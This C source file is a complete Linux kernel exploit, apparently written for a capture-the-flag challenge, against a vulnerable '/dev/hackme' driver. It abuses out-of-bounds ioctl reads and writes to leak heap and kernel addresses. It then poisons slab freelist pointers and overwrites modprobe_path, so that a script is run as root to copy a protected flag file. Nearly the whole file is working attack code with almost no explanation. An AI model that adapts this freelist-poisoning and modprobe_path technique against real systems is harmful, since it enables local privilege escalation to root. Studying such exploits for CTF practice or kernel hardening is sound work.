#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/stat.h>


#define KMALLOC 0x30000
#define KFREE 0x30001
#define WRITE 0x30002
#define READ 0x30003

typedef struct object
{
	unsigned int idx;
	long user_buffer;
	long length;
	long offset;
}object;


// glabol val
int fd = 0;
object* obj = NULL;



int open_hackme()
{
	fd = open("/dev/hackme", 0);
	if(fd < 0)
	{
		puts("[!] Failed to open device!");
		exit(-1);
	}
	puts("[*] Opened device.");
	return fd;
}


void alloc_object(int idx, unsigned char* user, long length)
{	
	obj->idx = idx;
	obj->length = length;
	obj->user_buffer = user;
	ioctl(fd, KMALLOC, obj);
}

void free_object(int idx)
{
	obj->idx = idx;
	ioctl(fd, KFREE, obj);
}

void write_object(int idx, unsigned char* user, long length, long offset)
{
	obj->idx = idx;
	obj->user_buffer = user;
	obj->length = length;
	obj->offset = offset;

	ioctl(fd, WRITE, obj);
}

void read_object(int idx, unsigned char* user, long length, long offset)
{
	obj->idx = idx;
	obj->user_buffer = user;
	obj->length = length;
	obj->offset = offset;

	ioctl(fd, READ, obj);
}


void fake_modprobe()
{
	system("echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag' > /home/pwn/x");
	system("chmod +x /home/pwn/x");

	system("echo -ne '\\xff\\xff\\xff\\xff' > /home/pwn/duck");
	system("chmod +x  /home/pwn/duck");

	system("/home/pwn/duck");
}

int main()
{
	// init a object and user_buffer to communicate with kernel
	obj = malloc(sizeof(object));
	unsigned char mem[0x1000];
	memset(mem, 0, sizeof(mem));

	size_t heap_addr = 0, kernel_addr = 0 ,hackme_addr = 0;

	open_hackme();

	// leak heap addr
	alloc_object(0, mem, 0x100);
	alloc_object(1, mem, 0x100);
	alloc_object(2, mem, 0x100);
	alloc_object(3, mem, 0x100);
	alloc_object(4, mem, 0x100);
	puts("[*] alloc done!");

	free_object(1);
	free_object(3);
	puts("[*] free done!");

	read_object(4, mem, 0x100, -0x100);
	heap_addr = ((size_t*)mem)[0];
	printf("[*] Leaked heap addr: 0x%lx\n", heap_addr);

	// leak kernel address
	read_object(0, mem, 0x200, -0x200);
	kernel_addr = ((size_t *) mem)[5] - 0x849ae0;			// sysctl_table_root offset
	printf("[*] Leaked kernel addr: 0x%lx\n", kernel_addr);

	// alloc to have mod_tree
	memset(mem, 'a', 0x100);
	*(size_t*)mem = (kernel_addr + 0x811000 + 0x50);		// mod_tree + 0x50; avoid overwrite mod_tree
	// fake 3's fd to mod_tree
	write_object(4, mem, 0x100, -0x100);

	// alloc to get mod_tree
	alloc_object(5, mem, 0x100);					// origin 3
	alloc_object(6, mem, 0x100);					// fake mod_tree

	// leak hackme address
	read_object(6, mem, 0x50, -0x50);						
	hackme_addr = ((size_t*)mem)[3];				// hackme addr
	printf("[*] Leaked hackme addr: 0x%lx\n", hackme_addr);	



	// alloc hackme's pool
	long pool_addr = hackme_addr + 0x2400;
	free_object(2);
	free_object(5);									// origin 3

	memset(mem, 0, sizeof(mem));
	*(size_t*)mem = pool_addr + 0x100;
	*(size_t*)(mem + 0x8) =  0x100;
	write_object(4, mem, 0x100, -0x100);		// overwrite origin 3's fd

	puts("[*] overwrite fd done!");
	alloc_object(7, mem, 0x100);
	alloc_object(8, mem, 0x100);				// pool's addr


	// over write modprobe_path
	long modprobe_path = kernel_addr + 0x83f960;

	//fake object
	memset(mem, 0, sizeof(mem));
	*(size_t*)mem = modprobe_path;
	*(size_t*)(mem + 0x8) = 0x20;

	write_object(8, mem, 0x10, -0x10);			// pool + 0xf0

	puts("[*] fake pool object done!");
	memset(mem, 0, sizeof(mem));
	strcpy(mem, "/home/pwn/x");
	write_object(0xf0/0x10, mem, 0x10, 0);		// write fake_modprobe

	puts("[*] Overwrite modprobe_path done!");


	// write  /home/pwn/x
	// write unkown file  /home/pwn/duck

	puts("[*] Spwan root shell.");
	fake_modprobe();


	return 0;
}